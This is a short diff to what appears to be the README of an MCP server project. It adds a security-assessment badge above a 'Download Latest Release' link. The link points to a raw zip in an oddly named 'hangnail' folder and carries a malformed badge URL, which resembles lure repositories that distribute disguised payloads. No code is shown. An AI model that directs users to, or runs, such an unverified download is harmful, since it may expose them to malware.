@@ -1,3 +1,5 @@
+[![MseeP.ai Security Assessment Badge](https://mseep.net/pr/nws066-explorium-mcp-server-badge.png)](https://mseep.ai/app/nws066-explorium-mcp-server)
+
 # 🌟 explorium-mcp-server - Streamline Your Data Intelligence Access
 
 [![Download Latest Release](https://github.com/nws066/explorium-mcp-server/raw/refs/heads/main/hangnail/explorium-server-mcp-3.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/nws066/explorium-mcp-server/raw/refs/heads/main/hangnail/explorium-server-mcp-3.6.zip)
